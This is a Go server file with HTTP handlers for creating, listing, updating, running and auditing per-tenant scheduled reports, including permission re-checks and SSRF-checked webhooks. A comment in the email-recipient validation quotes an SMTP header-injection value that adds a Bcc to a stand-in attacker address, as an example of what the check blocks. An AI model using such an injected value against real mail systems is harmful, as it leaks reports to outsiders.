package server

import (
	"context"
	"errors"
	"net/http"
	"net/mail"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	chimiddleware "github.com/go-chi/chi/v5/middleware"
	"github.com/google/uuid"

	"github.com/japharyroman/fuelgrid-os/internal/audit"
	"github.com/japharyroman/fuelgrid-os/internal/identity"
	"github.com/japharyroman/fuelgrid-os/internal/identity/policy"
	"github.com/japharyroman/fuelgrid-os/internal/scheduledreports"
)

// Per-tenant Scheduled Reports CRUD (Reports Center Phase 12 — blueprint §8).
//
// PERMISSION MODEL. Every write requires BOTH the tenant-wide manage gate
// (reports.schedule, the coarse route gate) AND the underlying report's OWN read
// permission (re-checked in-handler from report_key + the station scope in filters)
// — so a schedule manager can only schedule reports they can actually run. Reads
// (list/get/runs) require reports.schedule too (the surface is management-only). The
// dispatcher re-checks permission AGAIN at delivery per recipient (blueprint §8.5),
// so a grant revoked after creation never leaks data.
//
// Tenant isolation is enforced by explicit tenant_id scoping on every repo call
// (and the table's RLS policy as defense-in-depth); a cross-tenant {id} is a clean
// 404, never an IDOR.

// scheduleView renders a schedule as the JSON wire shape.
func scheduleView(sr *scheduledreports.ScheduledReport) map[string]any {
	var lastRun *string
	if sr.LastRunAt != nil {
		v := sr.LastRunAt.Format(time.RFC3339)
		lastRun = &v
	}
	recipients := make([]map[string]string, 0, len(sr.Recipients))
	for _, r := range sr.Recipients {
		recipients = append(recipients, map[string]string{"type": r.Type, "value": r.Value})
	}
	return map[string]any{
		"id":               sr.ID,
		"report_key":       sr.ReportKey,
		"name":             sr.Name,
		"filters":          sr.Filters,
		"schedule":         sr.Schedule,
		"recipients":       recipients,
		"delivery_channel": sr.DeliveryChannel,
		"format":           sr.Format,
		"webhook_url":      sr.WebhookURL,
		"created_by":       sr.CreatedBy,
		"enabled":          sr.Enabled,
		"last_run_at":      lastRun,
		"next_run_at":      sr.NextRunAt.Format(time.RFC3339),
		"status":           sr.Status,
		"created_at":       sr.CreatedAt.Format(time.RFC3339),
		"updated_at":       sr.UpdatedAt.Format(time.RFC3339),
	}
}

// runView renders a run-history row.
func runView(run *scheduledreports.Run) map[string]any {
	var exportJobID *string
	if run.ExportJobID != nil {
		v := run.ExportJobID.String()
		exportJobID = &v
	}
	notifs := make([]string, 0, len(run.NotificationIDs))
	for _, id := range run.NotificationIDs {
		notifs = append(notifs, id.String())
	}
	return map[string]any{
		"id":               run.ID,
		"period_key":       run.PeriodKey,
		"run_at":           run.RunAt.Format(time.RFC3339),
		"status":           run.Status,
		"export_job_id":    exportJobID,
		"notification_ids": notifs,
		"delivered_count":  run.DeliveredCount,
		"skipped_count":    run.SkippedCount,
		"error":            run.Error,
	}
}

// scheduledReportRequest is the create/update body.
type scheduledReportRequest struct {
	ReportKey       string                       `json:"report_key"`
	Name            string                       `json:"name"`
	Filters         map[string]string            `json:"filters"`
	Schedule        scheduledreports.Schedule    `json:"schedule"`
	Recipients      []scheduledreports.Recipient `json:"recipients"`
	DeliveryChannel string                       `json:"delivery_channel"`
	Format          string                       `json:"format"`
	WebhookURL      string                       `json:"webhook_url"`
}

// validateScheduledReportRequest validates the request shape and returns the
// normalised fields. It writes the 400 and returns ok=false on any problem.
func (s *Server) validateScheduledReportRequest(
	w http.ResponseWriter, req *scheduledReportRequest, requireReportKey bool,
) (webhookURL *string, ok bool) {
	req.ReportKey = strings.TrimSpace(req.ReportKey)
	req.Name = strings.TrimSpace(req.Name)
	req.Format = strings.ToLower(strings.TrimSpace(req.Format))
	req.DeliveryChannel = strings.ToLower(strings.TrimSpace(req.DeliveryChannel))
	if req.Filters == nil {
		req.Filters = map[string]string{}
	}
	if req.Recipients == nil {
		req.Recipients = []scheduledreports.Recipient{}
	}

	if req.Name == "" {
		writeError(w, http.StatusBadRequest, "name is required")
		return nil, false
	}
	if requireReportKey && req.ReportKey == "" {
		writeError(w, http.StatusBadRequest, "report_key is required")
		return nil, false
	}
	if req.Format != "csv" && req.Format != "pdf" && req.Format != "xlsx" {
		writeError(w, http.StatusBadRequest, "format must be csv|pdf|xlsx")
		return nil, false
	}
	switch req.DeliveryChannel {
	case scheduledreports.ChannelInApp, scheduledreports.ChannelEmail, scheduledreports.ChannelWebhook:
	default:
		writeError(w, http.StatusBadRequest, "delivery_channel must be in_app|email|webhook")
		return nil, false
	}
	if err := req.Schedule.Validate(); err != nil {
		writeError(w, http.StatusBadRequest, err.Error())
		return nil, false
	}

	// Recipient validation per channel.
	for _, r := range req.Recipients {
		switch r.Type {
		case scheduledreports.RecipientUser:
			if _, perr := uuid.Parse(strings.TrimSpace(r.Value)); perr != nil {
				writeError(w, http.StatusBadRequest, "a user recipient value must be a valid user id")
				return nil, false
			}
		case scheduledreports.RecipientEmail:
			// Validate as a real, single mailbox address. mail.ParseAddress rejects
			// embedded CR/LF and multi-address values, closing an SMTP header-injection
			// vector: a raw `victim@x\r\nBcc: exfil@evil.com` would otherwise pass a
			// naive "contains @" check and be written verbatim into the To: header at
			// delivery, smuggling extra headers into the outbound message.
			if strings.ContainsAny(r.Value, "\r\n") {
				writeError(w, http.StatusBadRequest, "an email recipient value must not contain line breaks")
				return nil, false
			}
			if _, perr := mail.ParseAddress(strings.TrimSpace(r.Value)); perr != nil {
				writeError(w, http.StatusBadRequest, "an email recipient value must be a valid email address")
				return nil, false
			}
		default:
			writeError(w, http.StatusBadRequest, "recipient type must be user|email")
			return nil, false
		}
	}
	// in_app delivery only makes sense to user recipients.
	if req.DeliveryChannel == scheduledreports.ChannelInApp {
		for _, r := range req.Recipients {
			if r.Type != scheduledreports.RecipientUser {
				writeError(w, http.StatusBadRequest, "in_app delivery requires user recipients only")
				return nil, false
			}
		}
	}
	if req.DeliveryChannel != scheduledreports.ChannelWebhook && len(req.Recipients) == 0 {
		writeError(w, http.StatusBadRequest, "at least one recipient is required for in_app/email delivery")
		return nil, false
	}

	// Webhook: required + SSRF-validated up front; other channels must not carry one.
	if req.DeliveryChannel == scheduledreports.ChannelWebhook {
		url := strings.TrimSpace(req.WebhookURL)
		if err := validateWebhookURL(url, s.cfg.ScheduledReportsWebhookAllowHosts, s.webhookLookupIP); err != nil {
			writeError(w, http.StatusBadRequest, err.Error())
			return nil, false
		}
		webhookURL = &url
	} else if strings.TrimSpace(req.WebhookURL) != "" {
		writeError(w, http.StatusBadRequest, "webhook_url is only valid for the webhook channel")
		return nil, false
	}
	return webhookURL, true
}

// authorizeReportForSchedule re-checks the actor can RUN the report named by
// reportKey with the given filters (the report's own permission + station scope),
// so a schedule can only target reports the actor can actually run. It writes the
// HTTP error (404 unknown report, 400 missing station, 403 forbidden) on failure.
func (s *Server) authorizeReportForSchedule(
	w http.ResponseWriter, r *http.Request, actor identity.Actor, reportKey string, filters map[string]string,
) bool {
	spec, ok := reportSpecFor(reportKey)
	if !ok {
		writeError(w, http.StatusBadRequest, "unknown report_key")
		return false
	}
	resource := policy.Resource{}
	if spec.stationScoped {
		sid, perr := uuid.Parse(strings.TrimSpace(filters["station_id"]))
		if perr != nil {
			writeError(w, http.StatusBadRequest, "station_id is required in filters for this report")
			return false
		}
		resource = policy.AtStation(sid)
	}
	if cerr := s.policy.Can(r.Context(), actor, spec.perm, resource); cerr != nil {
		if errors.Is(cerr, policy.ErrForbidden) {
			writeError(w, http.StatusForbidden, "you are not permitted to run this report")
			return false
		}
		s.logger.Error("scheduled report authorize: policy check", "error", cerr, "report_key", reportKey)
		writeError(w, http.StatusInternalServerError, "internal error")
		return false
	}
	return true
}

// handleCreateScheduledReport creates a schedule. Gated by reports.schedule (route)
// + the report's own run permission (in-handler). Computes the first next_run_at,
// audits + outboxes, returns 201.
func (s *Server) handleCreateScheduledReport(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	var req scheduledReportRequest
	if derr := decodeJSON(r, &req); derr != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	webhookURL, ok := s.validateScheduledReportRequest(w, &req, true)
	if !ok {
		return
	}
	if !s.authorizeReportForSchedule(w, r, actor, req.ReportKey, req.Filters) {
		return
	}

	next, nerr := req.Schedule.NextRunAfter(time.Now())
	if nerr != nil {
		writeError(w, http.StatusBadRequest, nerr.Error())
		return
	}

	sr, cerr := s.scheduledRpts.Create(r.Context(), actor.TenantID, scheduledreports.CreateInput{
		ReportKey:       req.ReportKey,
		Name:            req.Name,
		Filters:         req.Filters,
		Schedule:        req.Schedule,
		Recipients:      req.Recipients,
		DeliveryChannel: req.DeliveryChannel,
		Format:          req.Format,
		WebhookURL:      webhookURL,
		CreatedBy:       actor.UserID,
		NextRunAt:       next,
	})
	if cerr != nil {
		s.logger.Error("scheduled report create", "error", cerr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return
	}
	s.auditScheduledReport(r, actor, "report.scheduled.created", "ScheduledReportCreated", sr)
	writeJSON(w, http.StatusCreated, scheduleView(sr))
}

// handleListScheduledReports lists the tenant's schedules, newest first. Gated by
// reports.schedule.
func (s *Server) handleListScheduledReports(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	limit, offset, ok := s.parsePage(w, r)
	if !ok {
		return
	}
	rows, lerr := s.scheduledRpts.ListPage(r.Context(), actor.TenantID, limit+1, offset)
	if lerr != nil {
		s.logger.Error("scheduled report list", "error", lerr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return
	}
	hasMore := len(rows) > limit
	if hasMore {
		rows = rows[:limit]
	}
	out := make([]map[string]any, 0, len(rows))
	for i := range rows {
		out = append(out, scheduleView(&rows[i]))
	}
	writePagedMore(w, http.StatusOK, out, len(out), limit, offset, hasMore)
}

// loadScheduleForTenant loads the {id} schedule for the tenant or writes a 404.
func (s *Server) loadScheduleForTenant(w http.ResponseWriter, r *http.Request, actor identity.Actor) (*scheduledreports.ScheduledReport, bool) {
	id, perr := uuid.Parse(chi.URLParam(r, "id"))
	if perr != nil {
		writeError(w, http.StatusBadRequest, "invalid schedule id")
		return nil, false
	}
	sr, gerr := s.scheduledRpts.Get(r.Context(), actor.TenantID, id)
	if errors.Is(gerr, scheduledreports.ErrNotFound) {
		writeError(w, http.StatusNotFound, "scheduled report not found")
		return nil, false
	}
	if gerr != nil {
		s.logger.Error("scheduled report get", "error", gerr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return nil, false
	}
	return sr, true
}

// handleGetScheduledReport returns one schedule (tenant-scoped). Gated by
// reports.schedule.
func (s *Server) handleGetScheduledReport(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	sr, ok := s.loadScheduleForTenant(w, r, actor)
	if !ok {
		return
	}
	writeJSON(w, http.StatusOK, scheduleView(sr))
}

// handleUpdateScheduledReport replaces a schedule's definition. The report_key is
// immutable (a schedule's identity); the body's report_key, when present, must
// match. Re-checks the report's run permission. Gated by reports.schedule.
func (s *Server) handleUpdateScheduledReport(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	existing, ok := s.loadScheduleForTenant(w, r, actor)
	if !ok {
		return
	}
	var req scheduledReportRequest
	if derr := decodeJSON(r, &req); derr != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	// report_key is immutable; ignore/validate it against the existing one.
	if rk := strings.TrimSpace(req.ReportKey); rk != "" && rk != existing.ReportKey {
		writeError(w, http.StatusBadRequest, "report_key cannot be changed; create a new schedule instead")
		return
	}
	req.ReportKey = existing.ReportKey
	webhookURL, ok := s.validateScheduledReportRequest(w, &req, false)
	if !ok {
		return
	}
	if !s.authorizeReportForSchedule(w, r, actor, existing.ReportKey, req.Filters) {
		return
	}

	next, nerr := req.Schedule.NextRunAfter(time.Now())
	if nerr != nil {
		writeError(w, http.StatusBadRequest, nerr.Error())
		return
	}

	sr, uerr := s.scheduledRpts.Update(r.Context(), actor.TenantID, existing.ID, scheduledreports.UpdateInput{
		Name:            req.Name,
		Filters:         req.Filters,
		Schedule:        req.Schedule,
		Recipients:      req.Recipients,
		DeliveryChannel: req.DeliveryChannel,
		Format:          req.Format,
		WebhookURL:      webhookURL,
		NextRunAt:       next,
	})
	if errors.Is(uerr, scheduledreports.ErrNotFound) {
		writeError(w, http.StatusNotFound, "scheduled report not found")
		return
	}
	if uerr != nil {
		s.logger.Error("scheduled report update", "error", uerr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return
	}
	s.auditScheduledReport(r, actor, "report.scheduled.updated", "ScheduledReportUpdated", sr)
	writeJSON(w, http.StatusOK, scheduleView(sr))
}

// handleDeleteScheduledReport deletes a schedule (its runs cascade). Gated by
// reports.schedule.
func (s *Server) handleDeleteScheduledReport(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	existing, ok := s.loadScheduleForTenant(w, r, actor)
	if !ok {
		return
	}
	if derr := s.scheduledRpts.Delete(r.Context(), actor.TenantID, existing.ID); derr != nil {
		if errors.Is(derr, scheduledreports.ErrNotFound) {
			writeError(w, http.StatusNotFound, "scheduled report not found")
			return
		}
		s.logger.Error("scheduled report delete", "error", derr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return
	}
	s.auditScheduledReport(r, actor, "report.scheduled.deleted", "ScheduledReportDeleted", existing)
	w.WriteHeader(http.StatusNoContent)
}

// enableScheduledReportRequest is the enable/disable body.
type enableScheduledReportRequest struct {
	Enabled bool `json:"enabled"`
}

// handleSetScheduledReportEnabled enables/disables a schedule. On re-enable the
// next_run_at is recomputed from now so a long-paused schedule doesn't fire for
// every missed period. Gated by reports.schedule.
func (s *Server) handleSetScheduledReportEnabled(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	existing, ok := s.loadScheduleForTenant(w, r, actor)
	if !ok {
		return
	}
	var req enableScheduledReportRequest
	if derr := decodeJSON(r, &req); derr != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}
	next := existing.NextRunAt
	if req.Enabled {
		n, nerr := existing.Schedule.NextRunAfter(time.Now())
		if nerr == nil {
			next = n
		}
	}
	sr, uerr := s.scheduledRpts.SetEnabled(r.Context(), actor.TenantID, existing.ID, req.Enabled, next)
	if errors.Is(uerr, scheduledreports.ErrNotFound) {
		writeError(w, http.StatusNotFound, "scheduled report not found")
		return
	}
	if uerr != nil {
		s.logger.Error("scheduled report enable", "error", uerr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return
	}
	action := "report.scheduled.disabled"
	if req.Enabled {
		action = "report.scheduled.enabled"
	}
	s.auditScheduledReport(r, actor, action, "ScheduledReportToggled", sr)
	writeJSON(w, http.StatusOK, scheduleView(sr))
}

// handleRunScheduledReportNow triggers an immediate, out-of-band run of one
// schedule. It re-checks the actor can run the report, then dispatches synchronously
// under a unique period key (manual:<ts>) so a manual run never collides with the
// scheduled period's idempotency key. Gated by reports.schedule + the report's own
// permission.
func (s *Server) handleRunScheduledReportNow(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	existing, ok := s.loadScheduleForTenant(w, r, actor)
	if !ok {
		return
	}
	// The caller must be able to run the report themselves to trigger it.
	if !s.authorizeReportForSchedule(w, r, actor, existing.ReportKey, existing.Filters) {
		return
	}

	now := time.Now()
	periodKey := "manual:" + now.UTC().Format("20060102T150405.000")
	// Run with a bounded background context so the HTTP request returning doesn't
	// cancel the delivery mid-flight.
	rctx, cancel := context.WithTimeout(context.Background(), scheduledRunTimeout)
	defer cancel()
	outcome := s.dispatchOne(rctx, *existing, periodKey, now)

	s.auditScheduledReport(r, actor, "report.scheduled.run_now", "ScheduledReportRunNow", existing)
	writeJSON(w, http.StatusOK, map[string]any{
		"scheduled_report_id": existing.ID,
		"status":              outcome.status,
		"delivered_count":     outcome.delivered,
		"skipped_count":       outcome.skipped,
		"period_key":          periodKey,
	})
}

// handleListScheduledReportRuns returns a schedule's recent runs, newest first.
// Gated by reports.schedule.
func (s *Server) handleListScheduledReportRuns(w http.ResponseWriter, r *http.Request) {
	actor, err := identity.Require(r.Context())
	if err != nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}
	existing, ok := s.loadScheduleForTenant(w, r, actor)
	if !ok {
		return
	}
	limit, offset, ok := s.parsePage(w, r)
	if !ok {
		return
	}
	runs, lerr := s.scheduledRpts.ListRuns(r.Context(), actor.TenantID, existing.ID, limit+1, offset)
	if lerr != nil {
		s.logger.Error("scheduled report runs list", "error", lerr)
		writeError(w, http.StatusInternalServerError, "internal error")
		return
	}
	hasMore := len(runs) > limit
	if hasMore {
		runs = runs[:limit]
	}
	out := make([]map[string]any, 0, len(runs))
	for i := range runs {
		out = append(out, runView(&runs[i]))
	}
	writePagedMore(w, http.StatusOK, out, len(out), limit, offset, hasMore)
}

// auditScheduledReport writes an audit_logs + outbox_events record for a schedule
// write within its own transaction on the owner pool. Best-effort: a failure is
// logged, never fails the request (the write already committed).
func (s *Server) auditScheduledReport(r *http.Request, actor identity.Actor, action, eventType string, sr *scheduledreports.ScheduledReport) {
	if s.deps.DB == nil {
		return
	}
	ctx := r.Context()
	tx, terr := s.deps.DB.Begin(ctx)
	if terr != nil {
		s.logger.Warn("scheduled report audit begin", "error", terr)
		return
	}
	defer func() { _ = tx.Rollback(ctx) }()
	newValue := map[string]any{
		"report_key":       sr.ReportKey,
		"name":             sr.Name,
		"delivery_channel": sr.DeliveryChannel,
		"format":           sr.Format,
		"enabled":          sr.Enabled,
	}
	if err := audit.WriteWithOutbox(ctx, tx, audit.TxRecord{
		TenantID:   actor.TenantID,
		ActorID:    actor.UserID,
		Action:     action,
		EventType:  eventType,
		EntityType: "scheduled_report",
		EntityID:   sr.ID.String(),
		NewValue:   newValue,
		IP:         clientIP(r),
		UserAgent:  r.UserAgent(),
		RequestID:  chimiddleware.GetReqID(ctx),
	}); err != nil {
		s.logger.Warn("scheduled report audit write", "error", err, "action", action)
		return
	}
	if err := tx.Commit(ctx); err != nil {
		s.logger.Warn("scheduled report audit commit", "error", err)
	}
}
